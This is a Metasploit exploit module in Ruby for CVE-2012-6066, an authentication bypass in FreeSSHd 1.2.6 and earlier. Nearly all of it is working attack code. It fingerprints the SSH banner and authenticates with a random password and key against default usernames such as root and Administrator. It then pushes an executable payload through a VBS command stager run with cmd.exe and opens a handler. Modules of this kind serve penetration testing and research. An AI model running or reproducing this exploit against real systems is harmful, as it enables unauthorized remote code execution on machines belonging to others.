require 'msf/core'
require 'tempfile'
class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::EXE

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Freesshd Authentication Bypass",
			'Description'    => %q{
					This module exploits a vulnerability found in FreeSSHd <= 1.2.6 to bypass
				authentication. You just need the username (which defaults to root). The exploit
				has been tested with both password and public key authentication.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Aris', # Vulnerability discovery and Exploit
					'kcope', # 2012 Exploit
					'Daniele Martini <cyrax[at]pkcrew.org>' # Metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2012-6066' ],
					[ 'OSVDB', '88006' ],
					[ 'BID', '56785' ],
					[ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2012-12/0012.html' ],
					[ 'URL', 'http://seclists.org/fulldisclosure/2010/Aug/132' ]
				],
			'Platform'       => 'win',
			'Privileged'     => true,
			'DisclosureDate' => "Aug 11 2010",
			'Targets' =>
				[
					[ 'Freesshd <= 1.2.6 / Windows (Universal)', {} ]
				],
			'DefaultTarget' => 0
		))

		register_options(
			[
				OptInt.new('RPORT', [false, 'The target port', 22]),
				OptString.new('USERNAMES',[true,'Space Separate list of usernames to try for ssh authentication','root admin Administrator'])
			], self.class)
	end

	def load_netssh
		begin
			require 'net/ssh'
			return true
		rescue LoadError
			return false
		end
	end

	def check
		connect
		banner = sock.recv(30)
		disconnect
		if banner =~ /SSH-2.0-WeOnlyDo/
			version=banner.split(" ")[1]
			return Exploit::CheckCode::Vulnerable if version =~ /(2.1.3|2.0.6)/
			return Exploit::CheckCode::Appears
		end
		return Exploit::CheckCode::Safe
	end


	def upload_payload(connection)
		exe = generate_payload_exe
		filename = rand_text_alpha(8) + ".exe"
		cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
		opts = {
			:linemax => 1700,
			:decoder => File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "vbs_b64"),
		}

		cmds = cmdstager.generate(opts)

		if (cmds.nil? or cmds.length < 1)
			print_error("The command stager could not be generated")
			raise ArgumentError
		end
		cmds.each { |cmd|
			ret = connection.exec!("cmd.exe /c "+cmd)
		}

	end

	def setup_ssh_options
		pass=rand_text_alpha(8)
		options={
			:password => pass,
			:port     => datastore['RPORT'],
			:timeout  => 1,
			:proxies  => datastore['Proxies'],
			:key_data => OpenSSL::PKey::RSA.new(2048).to_pem
		}
		return options
	end

	def do_login(username,options)
		print_status("Trying username "+username)
		options[:username]=username

		transport = Net::SSH::Transport::Session.new(datastore['RHOST'], options)
		auth = Net::SSH::Authentication::Session.new(transport, options)
		auth.authenticate("ssh-connection", username, options[:password])
		connection = Net::SSH::Connection::Session.new(transport, options)
		begin
			Timeout.timeout(10) do
				connection.exec!('cmd.exe /c echo')
			end
		rescue  RuntimeError
			return nil
		rescue	Timeout::Error
			print_status("Timeout")
			return nil
		end
		return connection
	end

	def exploit
		#
		# Load net/ssh so we can talk the SSH protocol
		#
		has_netssh = load_netssh
		if not has_netssh
			print_error("You don't have net/ssh installed.  Please run gem install net-ssh")
			return
		end

		options=setup_ssh_options

		connection = nil

		usernames=datastore['USERNAMES'].split(' ')
		usernames.each { |username|
			connection=do_login(username,options)
			break if connection
		}

		if connection
			print_status("Uploading payload. (This step can take up to 5 minutes. But if you are here, it will probably work. Have faith.)")
			upload_payload(connection)
			handler
		end
	end
end

